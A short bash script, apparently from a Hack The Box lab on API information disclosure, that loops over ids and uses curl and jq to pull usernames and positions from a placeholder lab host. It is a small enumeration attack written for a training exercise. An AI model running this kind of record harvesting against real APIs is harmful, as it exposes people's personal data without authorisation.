#!/bin/bash

# Hackthebox API Attacks: Information Disclosure
# Use jq to iterate through an array to access the first object in it

url="http://IP:3003"

for i in {1..3}; do 
    request=$(curl -s "$url/?id=$i")
    id=$(echo "$request" | jq -r '.[0].id')
    uName=$(echo "$request" | jq -r '.[0].username')
    posi=$(echo "$request" | jq -r '.[0].position')
    echo "id: $id, username: $uName, position: $posi"
done